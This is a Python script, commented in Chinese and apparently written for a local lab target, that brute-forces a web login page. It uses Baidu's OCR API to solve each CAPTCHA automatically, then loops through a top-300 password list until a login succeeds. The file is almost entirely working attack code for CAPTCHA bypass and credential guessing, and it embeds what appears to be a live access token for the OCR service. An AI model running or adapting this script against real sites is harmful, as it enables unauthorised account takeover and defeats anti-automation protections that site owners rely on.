# coding:utf-8
import base64
import time

import requests
from tqdm import tqdm


# 百度在线获取access-token
def baidu_token():
    client_id = '你的API Key'   #API Key
    client_secret = '你的Secret Key'   #Secret Key
    host = f'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&' \
           f'client_id={client_id}&' \
           f'client_secret={client_secret}'
    response = requests.get(host)
    print(response.text)

# 调用百度接口完成OCR识别
def baidu_ocr():
    url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    # 二进制方式打开图片文件
    f = open(r"D:\Users\86133\Desktop\vcode.png",'rb')
    img = base64.b64encode(f.read())

    params = {"image":img}
    access_token = '24.8796578eda0d6b960219de051225bd2c.2592000.1694402426.282335-37566959'
    request_url = url + "?access_token=" + access_token
    headers = {'content-type' : 'application/x-www-form-urlencoded'}
    response = requests.post(request_url,data=params,headers=headers)
    if response:
        print(response.json())
    print(response.text)

# 利用OCR实现爆破
def burst_login(password):
    session = requests.session()
    # 先获取验证码图片的二进制数据
    resp_vcode = session.get('http://192.168.88.130/security/vcode.php')
    img = base64.b64encode(resp_vcode.content)

    # 交给百度OCR识别
    params = {"image": img}
    access_token = '24.8796578eda0d6b960219de051225bd2c.2592000.1694402426.282335-37566959'
    baidu_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    baidu_url = baidu_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    resp_baidu = requests.post(baidu_url, data=params, headers=headers)
    if resp_baidu:
        vcode = resp_baidu.json()["words_result"][0]["words"]

    # 进行登录的爆破
    data = {'username': 'fjchiyzly', 'password': password, 'vcode': vcode}
    login_url = 'http://192.168.88.130/security/login-3.php'
    resp = session.post(login_url, data)
    if 'vcode-error' in resp.text:
        print(f'验证码出错: {data}')   # 用于对验证码出错的再爆破
    elif('login-fail' not in resp.text) and ('vcode-error' not in resp.text):
        print(f'登录成功!,Payload为：{data}')




if __name__ == '__main__':
    #baidu_token()
    #baidu_ocr()

    with open(r"D:\share\tool\password-top300.txt") as file:
        pass_list = file.readlines()

    for password in tqdm(pass_list):
        burst_login(password[:-1])
        time.sleep(2)
